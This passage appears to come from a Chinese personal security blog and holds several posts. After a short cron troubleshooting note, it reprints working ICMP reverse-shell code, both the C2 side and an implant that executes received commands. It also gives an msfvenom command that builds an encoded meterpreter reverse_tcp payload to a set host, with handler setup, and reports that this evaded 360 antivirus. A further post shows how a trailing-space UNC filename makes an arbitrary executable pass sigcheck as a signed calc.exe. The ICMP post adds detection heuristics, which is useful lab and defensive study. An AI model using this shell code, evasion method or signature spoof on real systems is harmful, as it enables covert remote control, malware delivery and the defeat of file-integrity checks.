<p>我这里使用了第一种。<br>crontab 中默认使用的环境变量如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin:/bin</span><br></pre></td></tr></table></figure>
<p>脚本中添加用户环境变量后，变为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
<h2 id="2-gt-amp-1使用"><a href="#2-gt-amp-1使用" class="headerlink" title="2&gt;&amp;1使用"></a><code>2&gt;&amp;1</code>使用</h2><p>排查问题的过程中使用了<code>2&gt;&amp;1</code>，很关键。问题现象是，<code>route &gt; log.txt</code>手动执行后，文件有内容，放到定时任务中只生成文件但是没有内容。<br>直到加入了<code>2&gt;&amp;1</code>才看到错误信息：找不到<code>route</code>命令，进而想到是环境变量的问题。这部分内容转自 <a href="https://www.cnblogs.com/yangyongzhi/p/3364939.html">https://www.cnblogs.com/yangyongzhi/p/3364939.html</a></p>
<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><ol>
<li>默认地，标准的输入为键盘，但是也可以来自文件或管道（pipe |）。</li>
<li>默认地，标准的输出为终端（terminal)，但是也可以重定向到文件，管道或后引号（backquotes `）。</li>
<li>默认地，标准的错误输出到终端，但是也可以重定向到文件。</li>
<li>标准的输入，输出和错误输出分别表示为<code>STDIN</code>，<code>STDOUT</code>，<code>STDERR</code>，也可以用0，1，2来表示。</li>
<li>其实除了以上常用的3中文件描述符，还有3~9也可以作为文件描述符。3~9你可以认为是执行某个地方的文件描述符，常被用来作为临时的中间描述符。</li>
<li>实例：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> 2&gt;errfile <span class="comment"># command的错误重定向到文件errfile。</span></span><br><span class="line"><span class="built_in">command</span> 2&gt;&amp;1 | ... <span class="comment">#  command的错误重定向到标准输出，错误和标准输出都通过管道传给下个命令。</span></span><br><span class="line">var=`<span class="built_in">command</span> 2&gt;&amp;1` <span class="comment">#  command的错误重定向到标准输出，错误和标准输出都赋值给var。</span></span><br><span class="line"><span class="built_in">command</span> 3&gt;&amp;2 2&gt;&amp;1 1&gt;&amp;3 | ... <span class="comment"># 实现标准输出和错误输出的交换。</span></span><br><span class="line">var=`<span class="built_in">command</span> 3&gt;&amp;2 2&gt;&amp;1 1&gt;&amp;3` <span class="comment"># 实现标准输出和错误输出的交换。</span></span><br><span class="line"><span class="built_in">command</span> 2&gt;&amp;1 1&gt;&amp;2 | ...     (wrong...)  <span class="comment"># 这个不能实现标准输出和错误输出的交换。因为shell从左到右执行命令，当执行完2&gt;&amp;1后，错误输出已经和标准输出一样的，再执行 1&gt;&amp;2也没有意义。</span></span><br></pre></td></tr></table></figure>
<h3 id="“2-gt-amp-1-file”和-“-gt-file-2-gt-amp-1”区别"><a href="#“2-gt-amp-1-file”和-“-gt-file-2-gt-amp-1”区别" class="headerlink" title="“2&gt;&amp;1 file”和 “&gt; file 2&gt;&amp;1”区别"></a>“2&gt;&amp;1 file”和 “&gt; file 2&gt;&amp;1”区别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat food 2&gt;&amp;1 &gt;file <span class="comment">#错误输出到终端，标准输出被重定向到文件file。</span></span><br><span class="line">2）cat food &gt;file 2&gt;&amp;1 <span class="comment">#标准输出被重定向到文件 file，然后错误输出也重定向到和标准输出一样，所以也错误输出到文件file。</span></span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>通常打开的文件在进程推出的时候自动的关闭，但是更好的办法是当你使用完以后立即关闭。用<code>m&lt;&amp;-</code>来关闭输入文件描述符<code>m</code>，用<code>m&gt;&amp;-</code>来关闭输出文件描述符<code>m</code>。如果你需要关闭标准输入用<code>&lt;&amp;-</code>， <code>&gt;&amp;-</code>被用来关闭标准输出。</p>
<h3 id="同时输出到终端和文件"><a href="#同时输出到终端和文件" class="headerlink" title="同时输出到终端和文件"></a>同时输出到终端和文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy <span class="built_in">source</span> dest | tee.exe copyerror.txt</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="http://docstore.mik.ua/orelly/unix/upt/ch45_21.htm">http://docstore.mik.ua/orelly/unix/upt/ch45_21.htm</a></li>
<li><a href="http://www.unix.com/shell-programming-scripting/34011-meaning-dev-null-2-1-a.html">http://www.unix.com/shell-programming-scripting/34011-meaning-dev-null-2-1-a.html</a></li>
<li><a href="http://docstore.mik.ua/orelly/unix/upt/ch08_13.htm">http://docstore.mik.ua/orelly/unix/upt/ch08_13.htm</a></li>
</ol>
<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>脚本内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">. /etc/profile</span><br><span class="line">DATE=$(date <span class="string">&quot;+%F %X&quot;</span>)</span><br><span class="line">gateway=<span class="string">&quot;192.168.0.1&quot;</span></span><br><span class="line"><span class="built_in">log</span>=<span class="string">&quot;/home/root/chkroute.log&quot;</span></span><br><span class="line">txt=<span class="string">&quot;/home/root/route.txt&quot;</span></span><br><span class="line">route &gt; <span class="variable">$txt</span> 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">awk -v varDATE=<span class="string">&quot;<span class="variable">$DATE</span>&quot;</span> -v vargateway=<span class="string">&quot;<span class="variable">$gateway</span>&quot;</span> -v varlog=<span class="string">&quot;<span class="variable">$log</span>&quot;</span> -v vartxt=<span class="string">&quot;<span class="variable">$txt</span>&quot;</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    if($1 == &quot;default&quot;)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if($2 != vargateway)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            printf(&quot;[%s]gateway %s is error, now del and add %s!\n&quot;,  varDATE, $2, vargateway) &gt;&gt; varlog</span></span><br><span class="line"><span class="string">            cmd=&quot;route del default gw &quot;$2</span></span><br><span class="line"><span class="string">            system(cmd);</span></span><br><span class="line"><span class="string">            system(&quot;sleep 1&quot;)</span></span><br><span class="line"><span class="string">            cmd=&quot;route add default gw &quot;vargateway</span></span><br><span class="line"><span class="string">            system(cmd);</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$txt</span>&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>ICMP隧道原理与检测</title>
    <url>/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="一-ICMP协议格式"><a href="#一-ICMP协议格式" class="headerlink" title="一. ICMP协议格式"></a>一. ICMP协议格式</h2><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p>
<p>注意，ICMP是是TCP/IP协议的一部分，属于网络层的协议（TCP/UDP是传输层在第4层，ICMP是第3层），而且是一种无连接的协议（参考UDP，直接发数据包）。</p>
<p>ICMP协议格式如下：</p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/W68IGdwJVOsLjrJ27D33kzLADdg9UVx9menz2mpnwEU.png" alt="image"></p>
<p>报文类型如下：</p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/wd1SMszPrMj71wHStIIusKFH7ogGaho5VZIIbxuT3U4.jpg" alt="image"></p>
<h2 id="二-ICMP隧道原理"><a href="#二-ICMP隧道原理" class="headerlink" title="二. ICMP隧道原理"></a>二. ICMP隧道原理</h2><p>利用ICMP的请求和应答数据包，将可选数据部分填充为控制指令或返回信息。</p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/yH7dTOsCgmFqaehgiCzQ0EI88AM9LqWzXR5u3R1m8pA.jpg" alt="image"></p>
<h2 id="三-工具演示"><a href="#三-工具演示" class="headerlink" title="三. 工具演示"></a>三. 工具演示</h2><p>工具为python+scapy（winpcap，win版的wireshark用的也是它）。<br>下载地址 <a href="https://github.com/krabelize/icmpdoor">https://github.com/krabelize/icmpdoor</a></p>
<p>控制端</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#ICMPdoor (ICMP reverse shell) C2</span></span><br><span class="line"><span class="comment">#By krabelize | cryptsus.com</span></span><br><span class="line"><span class="comment">#More info: https://cryptsus.com/blog/icmp-reverse-shell.html</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sr,IP,ICMP,Raw,sniff</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment">#Variables</span></span><br><span class="line">ICMP_ID = <span class="built_in">int</span>(<span class="number">13170</span>)</span><br><span class="line">TTL = <span class="built_in">int</span>(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_scapy</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sr,IP,ICMP,Raw,sniff</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        print(<span class="string">&quot;Install the Py3 scapy module&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--interface&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Listener (virtual) Network Interface (e.g. eth0)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--destination_ip&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Destination IP address&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sniffer</span>():</span></span><br><span class="line">    sniff(iface=args.interface, prn=shell, <span class="built_in">filter</span>=<span class="string">&quot;icmp&quot;</span>, store=<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    <span class="keyword">if</span> pkt[IP].src == args.destination_ip <span class="keyword">and</span> pkt[ICMP].<span class="built_in">type</span> == <span class="number">0</span> <span class="keyword">and</span> pkt[ICMP].<span class="built_in">id</span> == ICMP_ID <span class="keyword">and</span> pkt[Raw].load:</span><br><span class="line">        icmppacket = (pkt[Raw].load).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(icmppacket)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    sniffing = Process(target=sniffer)</span><br><span class="line">    sniffing.start()</span><br><span class="line">    print(<span class="string">&quot;[+]ICMP C2 started!&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        icmpshell = <span class="built_in">input</span>(<span class="string">&quot;shell: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> icmpshell == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">            print(<span class="string">&quot;[+]Stopping ICMP C2...&quot;</span>)</span><br><span class="line">            sniffing.terminate()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> icmpshell == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(<span class="built_in">type</span>=<span class="number">8</span>,<span class="built_in">id</span>=ICMP_ID)/Raw(load=icmpshell))</span><br><span class="line">            sr(payload, timeout=<span class="number">0</span>, verbose=<span class="number">0</span>)</span><br><span class="line">    sniffing.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>被控端</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#ICMPdoor (IMCP reverse shell) [implant]</span></span><br><span class="line"><span class="comment">#By krabelize | cryptsus.com</span></span><br><span class="line"><span class="comment">#More info: https://cryptsus.com/blog/icmp-reverse-shell.html</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sr,IP,ICMP,Raw,sniff</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#Variables</span></span><br><span class="line">ICMP_ID = <span class="built_in">int</span>(<span class="number">13170</span>)</span><br><span class="line">TTL = <span class="built_in">int</span>(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_scapy</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sr,IP,ICMP,Raw,sniff</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        print(<span class="string">&quot;Install the Py3 scapy module&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--interface&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;(Virtual) Network Interface (e.g. eth0)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--destination_ip&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Destination IP address&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmpshell</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    <span class="keyword">if</span> pkt[IP].src == args.destination_ip <span class="keyword">and</span> pkt[ICMP].<span class="built_in">type</span> == <span class="number">8</span> <span class="keyword">and</span> pkt[ICMP].<span class="built_in">id</span> == ICMP_ID <span class="keyword">and</span> pkt[Raw].load:</span><br><span class="line">        icmppaket = (pkt[Raw].load).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        payload = os.popen(icmppaket).readlines()</span><br><span class="line">        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(<span class="built_in">type</span>=<span class="number">0</span>, <span class="built_in">id</span>=ICMP_ID)/Raw(load=payload))</span><br><span class="line">        sr(icmppacket, timeout=<span class="number">0</span>, verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+]ICMP listener started!&quot;</span>)</span><br><span class="line">sniff(iface=args.interface, prn=icmpshell, <span class="built_in">filter</span>=<span class="string">&quot;icmp&quot;</span>, store=<span class="string">&quot;0&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>运行效果如下：</p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/HbLc4VanP0RvH19DEH4VVmHr7ul7tLwD2ucGhqIQw.png" alt="image"></p>
<p>隧道流量抓包：</p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/u5NvnxwfcUZtq2UTMotfsSOI_qrgeKZke1tLenzwIjY.png" alt="image"></p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/D8QGFM1SCDKueRphH3r3Px_KZTr5wNZBIbY-oEc0Ovo.png" alt="image"></p>
<p>正常流量抓包：</p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/rcgRhI2TGH6qXoRuC9NQvNTxhWjZXHTolS3_eroipkY.png" alt="image"></p>
<h2 id="四-检测方法"><a href="#四-检测方法" class="headerlink" title="四. 检测方法"></a>四. 检测方法</h2><ol>
<li>数据包之间的时间间隔，正常ping命令产生的数据包，时间间隔固定，ICMP隧道工具的时间间隔不固定；</li>
<li>数据包大小，正常的固定，隧道的不固定；</li>
<li>响应包内容，正常的数据包，请求包与相应包内容一致，隧道的根据不同的指令会返回不同的内容。</li>
</ol>
<h2 id="五-复现时想到的一些问题"><a href="#五-复现时想到的一些问题" class="headerlink" title="五. 复现时想到的一些问题"></a>五. 复现时想到的一些问题</h2><ol>
<li>工具的优劣势<br>说实话没发现有啥优势，终端上一般自带的杀软或防火墙默认关闭ping响应，服务器网段可能还有用武之地；<br>劣势更多，不稳定，协议内容简单，要想实现稳定传输还要再对数据封装，参考UDP模拟TCP。<br>还有一个原因也很重要，使用ICMP隧道需要管理员权限。<br>为什么需要管理员权限？<br>根据协议图可知，ICMP协议是比TCP、UDP更低一层的协议，开发时设置socket的参数为原始套接字，与TCP、UDP不一样，参数为<strong>SOCK_RAW</strong>：</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create a raw socket with IPPROTO_ICMP protocol</span></span><br><span class="line">sockRaw = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);</span><br><span class="line"><span class="keyword">if</span>(sockRaw == INVALID_SOCKET) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WSASocket() failed: %d \n&quot;</span>, WSAGetLastError());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MSDN上关于原始套接字<strong>SOCK_RAW</strong>的解释：</p>
<blockquote>
<p>Raw sockets offer the capability to manipulate the underlying transport, so they can be used for malicious purposes that pose a security threat. Therefore, only members of the Administrators group can create sockets of type SOCK_RAW on Windows 2000 and later.<br>原始套接字提供了操纵底层传输的能力，因此它们可用于构成安全威胁的恶意目的。 因此，只有管理员组的成员才能在 Windows 2000 和更高版本上创建 SOCK_RAW 类型的套接字。</p>
</blockquote>
<p>演示的工具也验证了这一点，Win10下非管理员启动被控制端会报错，Kali也需要sudo才可以运行：</p>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/qTJk5Xuos1T0odUyqCZSqceFCfXpAwyzRIx7hahQoZM.png" alt="image"></p>
<ol>
<li><p>对于使用ICMP协议的进程，如何定位？<br>很遗憾，没找到方法可以定位。从协议的角度来说，ICMP是处理设备与设备间的通信情况，不涉及具体进程。</p>
</li>
<li><p>同样使用ICMP协议的ping.exe为什么不需要管理员权限？<br>Windows上，ping.exe没有直接使用原始套接字，而是使用的<strong>iphlpapi.dll</strong>中的<strong>IcmpSendEcho2Ex</strong>函数，只能发送正常的ICMP数据包；Linux上ping的做法（摘自知乎）：</p>
</li>
</ol>
<p><img src="/2022/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ICMP%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86%E4%B8%8E%E6%A3%80%E6%B5%8B/Hya-3qakktoFDA351OBiIpqcJ4QrZ3xT24sZ2l3vT_o.png" alt="image"></p>
<p>注意<code>icmp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</code>这种写法是Linux特有的，Windows上这么写<code>socket</code> 会返回失败。</p>
<p>参考资料：</p>
<p><a href="https://baike.baidu.com/item/ICMP">https://baike.baidu.com/item/ICMP</a></p>
<p><a href="https://www.freebuf.com/articles/web/289357.html">https://www.freebuf.com/articles/web/289357.html</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/winsock/tcp-ip-raw-sockets-2">https://docs.microsoft.com/en-us/windows/win32/winsock/tcp-ip-raw-sockets-2</a></p>
<p><a href="https://www.zhihu.com/question/20057415">https://www.zhihu.com/question/20057415</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>payload分离免杀实验</title>
    <url>/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<p>原文链接：<a href="https://micro8.gitbook.io/micro8/contents-1/41-50/47payload-fen-li-mian-sha-si-lu">https://micro8.gitbook.io/micro8/contents-1/41-50/47payload-fen-li-mian-sha-si-lu</a></p>
<h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.78.1 lport=8888 -e x86/shikata_ga_nai -i 5 -f raw &gt; test.bin</span><br></pre></td></tr></table></figure>
<h2 id="msf监听端口"><a href="#msf监听端口" class="headerlink" title="msf监听端口"></a>msf监听端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set playload windows/meterpreter/reverse_tcp</span><br><span class="line">playload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
<h2 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h2><p>1. 下载 github 上的shellcode加载器，把加载器和shellcode用WinRar打包成自解压文件；<br>2. 在 WinXP 虚拟机中运行；<br>3. 在开启360的情况下，正常运行，效果如下：<br><img src="/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C/67868500.png" alt="67868500.png"><br><img src="/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C/67916687.png" alt="67916687.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>利用文件名欺骗伪造Catalog签名</title>
    <url>/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Windows默认要求，文件名中不能以空格开头或结尾，如果有空格，系统会自动移除。但是如果使用UNC文件名，空格会被保留。部分校验工具，没有处理好这种特殊文件名，导致校验文件时，拼接了错误的文件路径，达到欺骗校验的效果。</p>
<h2 id="测试伪造效果"><a href="#测试伪造效果" class="headerlink" title="测试伪造效果"></a>测试伪造效果</h2><h3 id="生成伪造文件"><a href="#生成伪造文件" class="headerlink" title="生成伪造文件"></a>生成伪造文件</h3><p>将一个用于计算Hash的exe文件，伪装为系统的计算器calc.exe：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> Hash.exe &gt; <span class="string">&quot;\\?\C:\Windows\System32\calc.exe &quot;</span></span><br></pre></td></tr></table></figure>
<p>查看文件属性-常规，两者显示基本一致，但在兼容性、文件图标、文件类型会漏出马脚：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/calc属性常规.png" alt="calc属性常规.png"></p>
<h3 id="使用伪造文件"><a href="#使用伪造文件" class="headerlink" title="使用伪造文件"></a>使用伪造文件</h3><p>Long UNC文件的文件名一般无法直接使用，需要转为短文件名，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;dir /x calc*</span><br><span class="line"> 驱动器 C 中的卷是 Windows</span><br><span class="line"> 卷的序列号是 4843-3834</span><br><span class="line"></span><br><span class="line"> C:\WINDOWS\system32 的目录</span><br><span class="line"></span><br><span class="line">2019/12/07  17:09            27,648              calc.exe</span><br><span class="line">2023/04/03  16:48            29,184 CALC~1.EXE   calc.exe</span><br><span class="line">               2 个文件         56,832 字节</span><br><span class="line">               0 个目录 603,596,009,472 可用字节</span><br></pre></td></tr></table></figure>
<p>使用sigcheck64.exe校验伪造的calc.exe文件，无论使用Long UNC文件名还是短文件名，均能通过校验：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\1\Sigcheck&gt;sigcheck64.exe <span class="string">&quot;\\?\C:\Windows\System32\calc.exe &quot;</span></span><br><span class="line"></span><br><span class="line">Sigcheck v2.90 - File version and signature viewer</span><br><span class="line">Copyright (C) 2004-2022 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">\\?\c:\windows\system32\calc.exe:</span><br><span class="line">        Verified:       Signed</span><br><span class="line">        Signing date:   3:35 2010/11/21</span><br><span class="line">        Publisher:      Microsoft Windows</span><br><span class="line">        Company:        Microsoft Corporation</span><br><span class="line">        Description:    Windows Calculator</span><br><span class="line">        Product:        Microsoft?Windows?Operating System</span><br><span class="line">        Prod version:   6.1.7600.16385</span><br><span class="line">        File version:   6.1.7600.16385 (win7_rtm.090713-1255)</span><br><span class="line">        MachineType:    64-bit</span><br><span class="line"></span><br><span class="line">C:\1\Sigcheck&gt;sigcheck64.exe <span class="string">&quot;C:\Windows\System32\CALC~1.exe&quot;</span></span><br><span class="line"></span><br><span class="line">Sigcheck v2.90 - File version and signature viewer</span><br><span class="line">Copyright (C) 2004-2022 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">c:\windows\system32\calc.exe :</span><br><span class="line">        Verified:       Signed</span><br><span class="line">        Signing date:   3:35 2010/11/21</span><br><span class="line">        Publisher:      Microsoft Windows</span><br><span class="line">        Company:        Microsoft Corporation</span><br><span class="line">        Description:    Windows Calculator</span><br><span class="line">        Product:        Microsoft?Windows?Operating System</span><br><span class="line">        Prod version:   6.1.7600.16385</span><br><span class="line">        File version:   6.1.7600.16385 (win7_rtm.090713-1255)</span><br><span class="line">        MachineType:    64-bit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sigcheck64.exe添加<code>-i</code>参数，用于显示完整的证书链，对比原始的计算器calc.exe证书信息，仍然完全一致：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/sigcheck-i.png" alt="sigcheck-i.png"></p>
